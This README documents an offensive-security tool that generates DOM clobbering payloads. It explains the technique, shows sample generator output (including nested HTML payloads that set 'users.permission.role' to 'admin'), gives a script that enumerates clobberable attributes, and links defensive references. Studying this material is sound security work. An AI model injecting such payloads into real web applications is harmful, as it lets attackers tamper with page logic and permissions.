# DOM Clobbering Generator

Full article on [OffensiveWeb](https://www.offensiveweb.com/docs/topics/dom-clobbering/).

## Getting started

**DOM Clobbering** is a vulnerability that originates from a naming collision between JavaScript variables and named HTML markups, where browsers replace pre-existing content of an undefined variable with an HTML element when the variable name and the element’s `name` (or `id`) attribute match.

## Attributes

### Attribute id

Example with a random tag with a `id` attribute:

```html
<h1 id="hd">Super title !</h1>

<script>
console.log(hd);            // <h1 id="hd">Super title !</h1>
console.log(window.hd);     // <h1 id="hd">Super title !</h1>
console.log(document.hd);   // undefined
console.log(hd.toString()); // [object HTMLHeadingElement]
console.log(hd.innerText);  // Super title !
</script>
```

### Attribute name

Example with a `form` tag with a `name` attribute:

```html
<form name="fm" method="GET" action="/login"></form>

<script>
console.log(fm);          // <form name="fm"></form>
console.log(window.fm);   // <form name="fm"></form>
console.log(document.fm); // <form name="fm"></form>
console.log(fm.method);   // get
console.log(fm.action);   // http://localhost/login
</script>
```

List of tags which supports the name attribute:
- `embed`, `form`, `iframe`, `image`, `img`, `object`

## Tool usage

### Depth 1

```bash
$ python3 generator.py link 'https://example.com'
********************* INFO **********************
ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
variable_name = 'link'
variable_value = 'https://example.com'
depth = 1
document_scope = False
chrome_required = False
******************** PAYLOAD #1 ********************
<a id="link" href="https://example.com"></a>
```

### Depth 2

```bash
$ python3 generator.py video.lang 'Hello!'
********************* INFO **********************
ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
variable_name = 'video.lang'
variable_value = 'Hello!'
depth = 2
document_scope = False
chrome_required = True
******************** PAYLOAD #1 ********************
<a id="video" lang="Hello!"></a>
******************** PAYLOAD #2 ********************
<form id="video" lang="Hello!"></form>
******************** PAYLOAD #3 ********************
<form name="video" lang="Hello!"></form>
******************** PAYLOAD #4 ********************
<input id="video" lang="Hello!"></input>
******************** PAYLOAD #5 ********************
<iframe id="video" lang="Hello!"></iframe>
******************** PAYLOAD #6 ********************
<iframe name="video" lang="Hello!"></iframe>
******************** PAYLOAD #7 ********************
<a id="video"></a><a id="video" name="lang" href="a:Hello!"></a>
```

### Depth 3

```bash
$ python3 generator.py users.permission.role 'admin'
********************* INFO **********************
ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
variable_name = 'users.permission.role'
variable_value = 'admin'
depth = 3
document_scope = False
chrome_required = True
******************** PAYLOAD #1 ********************
<form id="users" name="permission" role="admin"></form>
<form id="users">
******************** PAYLOAD #2 ********************
<form id="users" name="permission">
    <input id="role" value="admin">
</form>
<form id="users">
```

### Depth 4

```bash
$ python3 generator.py music.metadata.sound.max '100%'
********************* INFO **********************
ALLOWED_ELEMENTS = ['a', 'form', 'input', 'iframe']
variable_name = 'music.metadata.sound.max'
variable_value = '100%'
depth = 4
document_scope = False
chrome_required = True
******************** PAYLOAD #1 ********************
<form id="music" name="metadata">
    <input id="sound" max="100%">
</form>
<form id="music">
```

## attributes.json 

```js
const tags = ["a", "abbr", "acronym", "address", "applet", "area", "article", "aside", "audio", "b", "base", "bdi", "bdo", "bgsound", "big", "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "data", "datalist", "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "em", "embed", "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", "frameset", "h1", "head", "header", "hgroup", "hr", "html", "i", "iframe", "image", "img", "input", "ins", "kbd", "keygen", "label", "legend", "li", "link", "main", "map", "mark", "marquee", "menu", "menuitem", "meta", "meter", "nav", "nobr", "noembed", "noframes", "noscript", "object", "ol", "optgroup", "option", "output", "p", "param", "picture", "plaintext", "portal", "pre", "progress", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp", "script", "section", "select", "slot", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "wbr", "xmp"];
const attributes = ["accept", "accept-charset", "accesskey", "action", "align", "allow", "alt", "async", "autocapitalize", "autocomplete", "autofocus", "autoplay", "background", "bgcolor", "border", "buffered", "capture", "challenge", "charset", "checked", "cite", "class", "code", "codebase", "color", "cols", "colspan", "content", "contenteditable", "contextmenu", "controls", "coords", "crossorigin", "csp", "data", "data-*", "datetime", "decoding", "default", "defer", "dir", "dirname", "disabled", "download", "draggable", "enctype", "enterkeyhint", "for", "form", "formaction", "formenctype", "formmethod", "formnovalidate", "formtarget", "headers", "height", "hidden", "high", "href", "hreflang", "http-equiv", "id", "integrity", "intrinsicsize", "inputmode", "ismap", "itemprop", "keytype", "kind", "label", "lang", "language", "loading", "list", "loop", "low", "manifest", "max", "maxlength", "minlength", "media", "method", "min", "multiple", "muted", "name", "novalidate", "open", "optimum", "pattern", "ping", "placeholder", "playsinline", "poster", "preload", "readonly", "referrerpolicy", "rel", "required", "reversed", "role", "rows", "rowspan", "sandbox", "scope", "scoped", "selected", "shape", "size", "sizes", "slot", "span", "spellcheck", "src", "srcdoc", "srclang", "srcset", "start", "step", "style", "summary", "tabindex", "target", "title", "translate", "type", "usemap", "value", "width", "wrap"];

let valids = {};
tags.forEach(tag => {
    attributes.forEach(attribute => {
        if (attribute != "id" && attribute != "name") {
            document.body.innerHTML = `<${tag} id="xyz" ${attribute}="xanhacks"></${tag}>`;
            try {
                if (eval(`xyz.${attribute} == "xanhacks"`)) {
                    if (!valids.hasOwnProperty(tag)) {
                        valids[tag] = [];
                    }
                    valids[tag].push(attribute);
                }
            } catch (e) {}
        }
    });
});
console.log(valids);
```

## References

- [PortSwigger - DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
- JavaScript for hackers - Gareth Heyes (book)
- [OWASP CS - DOM Clobbering](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)
- [DOM Clobbering - Frederik Braun](https://www.htmhell.dev/adventcalendar/2022/12/)
- [WHATWG - Named access on the Window object](https://html.spec.whatwg.org/multipage/nav-history-apis.html#named-access-on-the-window-object)
- [It’s (DOM) Clobbering Time: Attack Techniques, Prevalence, and Defenses](https://scnps.co/papers/sp23_domclob.pdf)
